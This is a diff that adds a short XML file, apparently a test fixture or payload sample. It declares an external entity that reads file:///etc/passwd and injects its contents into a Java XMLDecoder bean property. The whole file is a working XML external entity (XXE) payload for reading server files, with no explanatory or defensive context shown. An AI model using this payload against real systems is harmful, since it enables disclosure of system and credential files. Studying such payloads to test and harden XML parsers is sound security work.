@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE contact [
+<!ENTITY xxx SYSTEM "file:///etc/passwd">
+]>
+<java version="1.7.0_21" class="java.beans.XMLDecoder">
+ <object class="Bean">
+  <void property="name">
+   <string>&xxx;</string>
+  </void>
+ </object>
+</java>
